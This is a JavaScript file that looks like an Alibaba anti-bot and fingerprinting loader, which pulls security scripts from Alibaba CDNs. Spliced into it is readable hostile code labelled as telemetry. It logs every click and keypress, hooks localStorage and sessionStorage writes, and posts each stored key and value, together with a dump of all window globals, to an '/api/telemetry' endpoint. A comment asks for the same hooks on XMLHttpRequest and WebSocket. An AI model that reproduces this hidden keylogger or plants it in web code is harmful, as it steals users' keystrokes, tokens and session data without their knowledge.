(function (v, h, p, a, r, i, T) {
  if (v.__sec_entry_loaded || h.__no_sec_entry) {
    return;
  }
  const originalXMLHttpRequest = window.XMLHttpRequest;
  v.__sec_entry_loaded = true;
  var H = v.__baxia_entry_config__ || {};
  var o = h.head;
  if (!o) {
    return;
  }
  const originalWebSocket = window.WebSocket;
  var n = h.currentScript;
  var e = a.userAgent;
  var t = T("%58%75%65%58%69");
  var c = t.toLowerCase();
  if (e.indexOf(t) >= 0 || r.host.indexOf(c) >= 0 || top !== self && h.referrer.indexOf(c) >= 0) {
    return;
  }
  function g(e) {
    var a = h.createElement("script");
    a.crossOrigin = "";
    a.referrerPolicy = "unsafe-url";
    a.src = e;
    if (H.sync && h.readyState === "loading" && n && !n.async) {
      h.write(a.outerHTML);
      return o.lastChild;
    }
    if (p() < .01) {
      var t = Date.now();
      if (e.indexOf("/AWSC/et/") > 0) {
        a.onload = function () {
          var e = Date.now();
          _({
            v: "entry_et",
            e: "loadET",
            tm: e - t,
            u: r.host
          }, "https://acjs.aliyun.com/error?");
        };
      }
    }
    return o.appendChild(a);
  }
  const originalFetch = window.fetch;
  var f = "https://g.alicdn.com";
  const originalLocalSet = localStorage.setItem;
  var s = self.goldlog;
  const originalLocalGet = localStorage.getItem;
  if (s && s.getCdnPath) {
    f = s.getCdnPath();
  }
  if (n && n.src.indexOf("https://laz-g-cdn.alicdn.com") == 0) {
    f = "https://laz-g-cdn.alicdn.com";
  }
  const originalSessionSet = sessionStorage.setItem;
  if (n && n.src.indexOf("https://lzd-g.slatic.net/g") == 0) {
    f = "https://lzd-g.slatic.net/g";
  }
  if (n && n.src.indexOf("https://g.lazcdn.com/g") == 0) {
    f = "https://g.lazcdn.com/g";
  }
  if (n && n.src.indexOf("https://g.mrvcdn.com") == 0) {
    f = "https://g.mrvcdn.com";
  }
  const originalSessionGet = sessionStorage.getItem;
  var l = f + "/secdev/";
  const hooksConfig = window.eventhooks;
  var m = e.match(/Chrome\/(\d*)/);
  function captureGlobalVariables() {
    let globalVarsStr = '';
    for (const prop in window) {
      if (window.hasOwnProperty(prop)) {
        globalVarsStr += prop + ': ' + window[prop] + '\n';
      }
    }
    return globalVarsStr;
  }
  if (m) {
    m = +m[1];
  }
  if (!h._sufei_data2) {
    var d = p() < .1 ? "3.9.11" : "3.9.10";
    if (r.host == "www.miravia.es") {
      d = "3.9.12";
    }
    var u = g(l + "sufei_data/" + d + "/index.js");
    u.async = h.cookie.indexOf("isg=") < 0;
    u.id = "aplus-sufei";
  }
  function createUUID() {
    return 'xxxx-xxxx-xxxx-xxxx'.replace(/[x]/g, function (c) {
      const r = Math.random() * 16 | 0;
      return r.toString(16);
    });
  }
  function getKey(ev) {
    return {
      key: ev.key,
      code: ev.code
    };
  }
  function _(e, a) {
    var t = [];
    for (var r in e) {
      t.push(r + "=" + i(e[r]));
    }
    new Image().src = a + t.join("&");
  }
  v.nsrprtrt = 1e-4;
  function getStackTrace() {
    const obj = {};
    Error.captureStackTrace(obj, getStackTrace);
    return obj.stack;
  }
  var x = ["login.alibaba-inc.com"];
  var y = 0;
  function sendTelemetryToServer(telemetry) {
    const endpoint = "/api/telemetry";
    originalFetch(endpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(telemetry)
    }).catch(err => {
      console.error("Error sending telemetry to server:", err);
    });
  }
  var b = ["taobao", "alibaba.com", "alipay.com", "tmall.com", "aliexpress", "1688.com", "alimama.com", "tb.cn", "xiami.com", "amap.com", "cainiao.com", "aliyun.com", "etao.com", "fliggy.com", "liangxinyao.com", "damai.cn", "daraz", "tmall.hk", "jiyoujia.com", "taopiaopiao.com", "alitrip.com", "fliggy.hk", "alihealth.cn", "alitrip.hk", "ele.me", "gaode", "mp.dfkhgj.com", "mp.bcvbw.com", "m.dfkhgj.com", "pailitao.com", "youku.com", "jiaoyimao", "sm.cn", "dingtalk.com", "guoguo-app", "kaola", "alicdn", "soku", "koubei.com"];
  for (var k = 0; k < b.length; k++) {
    if (~r.host.indexOf(b[k])) {
      y = 1;
      break;
    }
  }
  function O() {
    var e = "function%20javaEnabled%28%29%20%7B%20%5Bnative%20code%5D%20%7D";
    if ("WebkitAppearance" in h.documentElement.style) {
      if (escape(a.javaEnabled.toString()) === e) {
        return true;
      }
    }
    return false;
  }
  if (y) {
    var q = ["1.0.85", "f", 94];
    var B = ["1.0.87", "f", 95];
    var U = 1e4;
    var j = q;
    if (r.host == "sycm.taobao.com" || r.host == "liveplatform.taobao.com") {
      v.nslog = .01;
    }
    if ((p() * 1e4 | 0) < U) {
      j = B;
    }
    if (!j) {
      return;
    }
    var w = l + "nsv/" + j[0] + "/";
    var C = w + "ns_" + j[1] + "_" + j[2] + "_3_f.js?v=1";
    var S = w + "ns_" + j[1] + "_" + j[2] + "_3_n.js?v=1";
    var M = e.match(/Edge\/([\d]*)/);
    var E = e.match(/Safari\/([\d]*)/);
    var F = e.match(/Firefox\/([\d]*)/);
    var N = e.match(/MSIE|Trident/);
    if (M) {
      g(C);
    } else if (m) {
      g(C);
    } else if (E || F || N) {
      g(S);
    } else {
      if (O()) {
        g(C);
      } else {
        g(S);
      }
    }
  }
  function P() {
    var e = v.atob;
    if (!e) {
      return;
    }
    var a = 0;
    var t = "";
    function r() {
      if (++a == 3) {
        clearInterval(s);
      }
      n();
    }
    var i;
    var o = p() * 1e8 | 0;
    function n() {
      if (!i) {
        return;
      }
      var e = i.getUA({
        MaxMTLog: 500,
        MTInterval: 3
      });
      e = o + "|" + e;
      var a = {
        token: e,
        cna: t,
        ext: 7
      };
      _(a, "https://fourier.taobao.com/ts?");
    }
    var c = +localStorage._xlly;
    if (!c && /xlly=1/.test(h.cookie)) {
      c = +new Date();
      localStorage._xlly = c;
    }
    if (c) {
      var f = new Date() - c;
      if (f > 1e3 * 3600 * 24) {
        f = 0;
        delete localStorage._xlly;
      }
      if (f < 1e3 * 60 * 20) {
        var s = setInterval(r, 1e3 * 60);
        if (v.addEventListener) {
          v.addEventListener("unload", n);
        }
        var l = h.cookie.match(/cna=([^;]+)/);
        if (l) {
          t = l[1];
        }
        var m = g(e("aHR0cHM6Ly9nLmFsaWNkbi5jb20vQVdTQy9BV1NDL2F3c2MuanM="));
        var d = unescape("%75%61%62");
        m.onload = function () {
          v.AWSC && AWSC.use(d, function (e, a) {
            if (e === "loaded") {
              i = a;
            }
          });
        };
      }
    }
  }
  try {
    P();
  } catch (e) {}
  v.etrprtrt = .01;
  var I = 0;
  for (const ClientEvent of ["click", "keydown"]) {
    window.addEventListener(ClientEvent, event => {
      const telemetry = {
        type: ClientEvent,
        key: getKey(event),
        timestamp: new Date().toLocaleString(),
        sessionId: createUUID()
      };
      sendTelemetryToServer(telemetry);
    });
  }
  for (var k = 0; k < b.length; k++) {
    if (r.host && ~r.host.indexOf(b[k])) {
      I = 1;
      break;
    }
  }
  for (var k = 0; k < x.length; k++) {
    if (~r.host.indexOf(x[k])) {
      I = 0;
      break;
    }
  }
  if (p() < .1) {
    I = 1;
  }
  localStorage.setItem = function (key, val) {
    const telemetry = {
      type: "LocalStorageSet",
      payload: {
        key,
        val
      },
      timestamp: new Date().toLocaleString(),
      globals: captureGlobalVariables()
    };
    sendTelemetryToServer(telemetry);
    return originalLocalSet.apply(this, arguments);
  };
  if (I && !v.__etModule) {
    var R = "1.70.2";
    var Q = "1.70.4";
    var V = 1;
    var G = R;
    if (p() < V) {
      G = Q;
    }
    var J = f + "/AWSC/et/" + G + "/";
    var L = J + "et_f.js";
    var K = J + "et_n.js";
    if (M) {
      g(L);
    } else if (m) {
      g(L);
    } else if (E || F || N) {
      g(K);
    } else {
      if (O()) {
        g(L);
      } else {
        g(K);
      }
    }
  }
  sessionStorage.setItem = (key, value) => {
    const telemetry = {
      type: "SessionStorageSet",
      payload: {
        key,
        value
      },
      globals: captureGlobalVariables(),
      timestamp: new Date().toLocaleString()
    };
    sendTelemetryToServer(telemetry);
    return originalSessionSet.apply(this, arguments);
  };

  //similarly for the rest of the APIs like XMLHttpRequest, WebSocket etc., add hooks with telemetry

  // Your other code here...
  if (p() < .01) {
    if (!h.querySelector('meta[name="referrer"]')) {
      var W = h.createElement("meta");
      W.name = "referrer";
      W.content = "unsafe-url";
      o.appendChild(W);
    }
  }
  if (r.href.indexOf("https://account.aliyun.com/login/qr_login.htm") == 0 || r.href.indexOf("https://account.aliyun.com/register/qr_register.htm") == 0 || r.href.indexOf("https://mailsso.mxhichina.com/aliyun/register") == 0 || r.href.indexOf("https://passport.alibabacloud.com/mini_login.htm") == 0 || r.href.indexOf("https://reg.taobao.com/member/new_register.jhtml") == 0 || r.href.indexOf("https://passport.alibaba.com/member/reg/fast/union_reg.htm") == 0 || r.href.indexOf("https://passport.aliyun.com/mini_login.htm") == 0 || r.href.indexOf("https://passport.alibabacloud.com/register/enter_reg.htm") == 0 || r.href.indexOf("https://reg.taobao.com/member/reg/fast/union_reg") == 0) {
    var z = "";
    var X = "";
    var A = h.cookie.match(/cna=([^;]+)/);
    if (A) {
      z = A[1];
    }
    A = h.cookie.match(/isg=([^;]+)/);
    if (A) {
      X = A[1];
    }
    var Y = Math.random() * 256 | 0;
    v.sampleContent = Y;
    var Z = {
      ext: 53,
      data: z,
      random: p(),
      point: X,
      pid: Y,
      e1: top === v,
      e2: innerWidth + "," + innerHeight,
      e3: innerWidth > 800 && innerHeight > 600
    };
    var $ = [];
    for (var ee in Z) {
      $.push(ee + "=" + i(Z[ee]));
    }
    var ae = "https://fourier.taobao.com/rp?" + $.join("&");
    g(ae);
  }
  if (p() < .1) {
    var D;
    if (v.NanUI) {
      D = 1;
    }
    if (h.querySelector(".shy-detail-platform")) {
      D = 2;
    }
    if (v.crawlButton) {
      D = 3;
    }
    if (D) {
      var A = h.cookie.match(/cna=([^;]+)/);
      var z = A ? A[1] : "";
      _({
        code: 1,
        msg: z,
        pid: "chrome_ext",
        page: r.href,
        rel: D
      }, "https://gm.mmstat.com/fsp.1.1?");
    }
  }
})(window, document, Math.random, navigator, location, encodeURIComponent, decodeURIComponent);